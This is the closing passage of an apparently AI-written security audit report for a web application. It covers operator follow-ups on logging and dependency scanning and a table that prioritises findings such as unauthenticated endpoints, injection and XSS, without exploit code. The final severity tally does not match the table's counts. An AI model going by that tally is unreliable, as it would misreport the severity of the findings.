**Operator action:** Confirm whether Render's log drain feature is configured. If not, all structured security logs (webhook auth failures, error events) are permanently lost on restart. Consider adding a log drain to an external service (Papertrail, Logtail, etc.) before first real brand onboarding.

---

### Q5 — `npm audit` Current State

Finding 2.7 notes that no automated dependency scanning exists. The implementing model did not run `npm audit` (per brief scope). Before Brief 14.4, the operator should run `npm audit --audit-level=high` manually and share the results with the brief-writer to inform whether Brief 14.4 needs urgent dependency updates.

---

## Section 7 — Summary by Priority for Brief 14.2-14.4 Scoping

> **Note for operator + brief-writer:** This section is informational only. The implementing model is not making sequencing decisions — this table is provided to make the findings easier to prioritize across subsequent briefs. The operator and brief-writer decide what lands in which brief.

| Finding | Severity | Suggested Brief |
|---|---|---|
| B.2.A — Unauthenticated Brief 14 endpoints (incl. Stripe transfer) | CRITICAL | 14.2 |
| ADDITIONAL-1 — `/api/deals` exposes full CRM unauthenticated | HIGH | 14.2 |
| 2.4 — No session/token auth anywhere | HIGH | 14.2 |
| EC-2 — PandaDoc soft-fail default | HIGH | 14.2 |
| B.2.F — Inbound reply spoofing via email From: | HIGH | 14.3 |
| B.2.B — Airtable formula injection (5 attacker-controlled sites) | HIGH | 14.3 |
| B.2.G — LLM cost abuse (unauthenticated outreach batch) | HIGH | 14.2/14.3 |
| 2.1 — No rate limiting | HIGH | 14.3 |
| 2.2 — No security headers / CORS policy | HIGH | 14.3 |
| ADDITIONAL-4 — Roster portal XSS via Airtable fields | MEDIUM | 14.3 |
| B.2.C — Stripe metadata amount not verified at lock | MEDIUM | 14.3 |
| ADDITIONAL-2 — CSRF (depends on auth mechanism in 14.2) | MEDIUM | 14.2 |
| 2.5 — Error responses leak internal state | LOW | 14.3 |
| 2.6 — Ephemeral log filesystem | MEDIUM | 14.4 |
| 2.7 — No dependency scanning | MEDIUM | 14.4 |
| EC-3 — SendGrid soft-fail default | HIGH | 14.2 (env var) |
| ADDITIONAL-3 — 50MB inbound body limit DoS | LOW | 14.3 |
| 2.10 — Outbound fetch no timeout | LOW | 14.3 |
| B.2.D — PandaDoc document ownership | MEDIUM | 14.3 (after EC-2) |
| B.2.E — Roster token multi-view | LOW | 14.3 |
| 2.9 — No webhook IP whitelist | LOW | 14.4 |
| 2.8 — Key rotation runbook | INFO | 14.4 (docs) |
| B.2.H — event_payload XSS | INFO | 15b/15c brief |
| EC-6 — classifyAndExtract dead code | INFO | 14.4 (cleanup) |

---

*End of Brief 14.1 Security Audit. Total findings: 27 (1 CRITICAL, 8 HIGH, 7 MEDIUM, 4 LOW, 4 INFO, 3 Already Implemented/Partial). No code was modified in the production of this report.*
